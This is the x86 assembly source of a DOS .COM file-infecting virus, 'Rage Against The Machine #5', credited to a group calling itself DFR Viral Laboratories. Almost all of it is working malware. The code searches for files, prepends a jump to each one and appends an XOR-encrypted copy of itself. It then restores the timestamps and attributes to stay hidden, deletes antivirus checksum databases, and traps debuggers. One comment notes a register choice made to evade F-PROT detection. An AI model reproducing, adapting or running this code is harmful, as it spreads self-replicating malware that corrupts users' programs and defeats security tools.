; Rage Against The Machine #5 - Saruman / DFR Viral Laboratories
;
; Specs: NON-RES .COM INFECTOR, ENCRYPTION, TIME/DATE PRESERVATION
;        ANTI-VIRUS CHECKSUM-FILE REMOVAL, DEBUG-TRAPS
;
; To Do:
;  Check already infected
;
;   read first three bytes.
;   if NOT jump then goto INFECT
;   if NOT jmp to filesize-virussize+entryofs then got INFECT
;   goto NEXTFILE
;
;

;  Check filesize
;  Scan dirs ...
;   make sure it won't encrypt with zeroes? (one chance in 65K, worth it?)

.model tiny
.code
.radix 16

include fileattr.inc

VirusSize   equ  END_OF_VIRUS - MAIN
EntryOfs    equ  STARTCODE - MAIN - 3

SizeMIN     equ  2
SizeMAX     equ  065400d-VirusSize

            org 100

main:       jmp startcode
dummy       db 0                             ;jmp short<>jmp near (2 vs 3 bytes)

; set marker here? Or read virus body?

write_virus:
            call endecrypt                   ;encrypt code
            mov cx,VIRUSSIZE
            int 21                           ;Write virus body
            call endecrypt                   ;decrypt code again
            ret

cryptkey    dw 0

; DESTROYS; di,cx,si
endecrypt:
            mov di,bp
            add di,offset encryption_start
            mov cx,(end_of_virus-encryption_start+1)/2
            mov si,bp+cryptkey
           cryptloop:
            xor word ptr[di],si
            add di,2
           loop cryptloop

            ret

startcode:
            call nextline
nextline:
            pop bx
            sub bx,offset nextline
            xchg bp,bx                        ;take the little way around
                                              ;using BX cause else F-PROT
                                              ;will find me as a variant
                                              ;of the Grunt virus.
            call endecrypt

encryption_start:
            mov ax,2500
            lea dx,bp+newINT1
            int 21h                           ;fool realmode debuggers.
            inc ax
            int 21h

            include no_msav.inc
            include no_deb01.inc

            mov di,100h                       ;Recreate header
            lea si,bp+orgheader
            cld
            movsw
            movsb

; now.. let's see....

            mov ah,1a
            lea dx,bp+dta
            int 21                            ;Setup DTA area

            include no_crc.inc                ;Nuke CHKLIST.MS + ANTI-VIR.DAT

            mov ah,4e
            mov cx,anyfile-directory          ;-readonly-hidden-system
            lea dx,bp+wildcard
            int 21                            ;Find First

            jc exit

checkit:
;            mov ax,word ptr [bp+file_size]
;            cmp ax,Size
;            jbe  next_victim
            call process_victim               ;Infect it!
next_victim:
            mov ah,4f
            int 21                            ;Find Next
            jnc checkit

exit:
            mov     ah,1ah                    ;ReSet DTA address ...
            mov     dx,80h                    ;... to default DTA
            int     21h
            xor     ax,ax                     ;Reset all regs
            mov     bx,ax
            mov     cx,ax
            mov     dx,ax
            mov     si,ax
            mov     di,ax
            mov     sp,0FFFEh                 ;SP= 0
            mov     bp,100h                   ;BP= 100h (RETurn addr)
            push    bp                        
            mov     bp,0                      
            ret                               ;return to 100h

process_victim:

            mov ax,4301
            lea dx,bp+filename
            mov cx,0
            int 21                           ;clear file-attributes
                                             ;BEFORE OPEN! = IMPORTANT!

            mov ax,3d02
            lea dx,bp+filename
            int 21                           ;Open file r/w

            mov BP+FILE,ax                   ;Save the file handle
            xchg ax,bx
            mov ah,3f
            mov cx,3
            lea dx,bp+ORGHEADER
            int 21                           ;Read first 3 bytes & store them

            mov ax,word ptr [bp+file_size]   ;Calculate jmp-header
            add ax,ENTRYOFS
            mov byte ptr [BP+BUF],0E9h       ; E9 = opcode for JMP
            mov word ptr [BP+BUF+1],ax       ; ax = filesize+offset into virus

            mov ax,4200
            xor cx,cx
            xor dx,dx
            int 21                           ;Seek to beginning of file
         
            mov ah,40
            mov cx,3
            lea dx,BP+BUF
            int 21                           ;Write JMP to header

            mov ax,4202
            xor cx,cx
            xor dx,dx
            int 21                           ;Seek to end of file


            mov byte ptr bp+fixme,1
            add word ptr bp+cryptkey,0ffffh
            mov ah,40
            lea dx,bp+main
;            mov bx,BP+FILE

            call write_virus

            mov ax,5701
            mov bx,BP+FILE
            mov cx,word ptr [bp+file_time]
            mov dx,word ptr [bp+file_date]
            int 21                           ;Restore old datestamp

            mov ah,3e
            int 21                           ;Close file

            lea dx,bp+filename
            mov ax,4301
            xor ch,ch
            mov cl,byte ptr [bp+attribute]
            int 21                           ;Restore old attributes

            ret

newINT1:
            db 0eah,0,0,0ffh,0ffh

orgheader   db 0cdh,020h,0                   ;terminate for 1:st generation
drive       db 0
wildcard:   db '*.!!!',0
message     db 'Rage Against The Machine'

END_OF_VIRUS:

include     dta.inc
buf         db ?,?,?
file        dw ?

end	main
